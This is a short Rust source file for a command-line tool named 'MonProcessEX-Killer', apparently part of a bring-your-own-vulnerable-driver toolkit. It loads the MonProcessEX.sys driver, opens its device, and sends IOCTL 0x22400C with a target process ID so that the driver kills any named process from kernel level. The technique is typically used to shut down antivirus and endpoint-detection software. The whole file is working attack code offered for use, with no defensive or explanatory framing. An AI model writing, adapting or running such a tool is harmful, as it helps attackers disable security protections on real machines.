use byovd_lib::{DriverConfig, Result};
use clap::Parser;

// ============================================================================
// Driver Configuration - MonProcessEX
// ============================================================================

struct MonProcessEX;
impl DriverConfig for MonProcessEX {
    fn driver_name(&self) -> &str {
        "MonProcessEX"
    }

    fn driver_file(&self) -> &str {
        "MonProcessEX.sys"
    }

    fn device_path(&self) -> &str {
        "\\\\.\\MonProcessEX"
    }

    fn ioctl_code(&self) -> u32 {
        0x22400C
    }

    fn build_ioctl_input(&self, pid: u32, _process_name: &str) -> Vec<u8> {
        pid.to_ne_bytes().to_vec()
    }

    fn ioctl_output_size(&self) -> usize {
        4
    }
}

// ============================================================================
// CLI
// ============================================================================

#[derive(Parser)]
#[command(name = "MonProcessEX-Killer", version, author = "BlackSnufkin, wwwab")]
#[command(about = "BYOVD process killer using MonProcessEX driver")]
struct Cli {
    /// Target process name (e.g., notepad.exe)
    #[arg(short = 'n', long = "name", required = true)]
    process_name: String,
}

// ============================================================================
// Main
// ============================================================================

fn main() -> Result<()> {
    let cli = Cli::parse();
    byovd_lib::run(&MonProcessEX, &cli.process_name, None)
}
